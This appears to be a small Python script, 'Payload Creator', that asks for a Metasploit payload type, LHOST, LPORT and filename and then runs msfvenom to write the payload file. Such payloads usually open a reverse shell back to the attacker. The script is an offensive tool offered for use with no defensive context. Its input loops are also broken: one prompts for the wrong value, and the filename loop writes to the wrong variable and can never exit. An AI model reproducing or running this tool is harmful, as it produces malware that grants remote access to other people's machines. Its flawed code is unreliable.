print("""
		-------------------------------------------------
		|	    Welcome To Payload Creator 		|
		| 						|
		|	            Red_foxy			|
		|						|
		-------------------------------------------------
""")

import subprocess

payload = input("Enter Payload:")

while payload == "":
    print("Enter Something")
    payload = input("Enter Payload:")

lhost = input("Enter LHOST:")

while lhost == "":
    print("Enter Something")
    lhost = input("Enter LPORT:")

lport = input("Enter LPORT:")

while lport == "":
    print("Enter Something")
    lport = input("Enter LPORT:")

outfor = input("Enter File Name With Extension:")

while outfor == "":
    print("Enter Something")
    payload = input("Enter File Name With Extension:")

print("""----------------------------------------------------------------------------
""")

print("""        Your...     Payload Was Creating........     Wait......
""")

print("""----------------------------------------------------------------------------
""")
subprocess.call(["msfvenom","-p",payload,"LHOST=" + lhost,"LPORT=" + lport,"-o",outfor])

print("""----------------------------------------------------------------------------
""")

print("""        		 ##### SUCESSFULLY CREATED #####
""")

print("""----------------------------------------------------------------------------
""")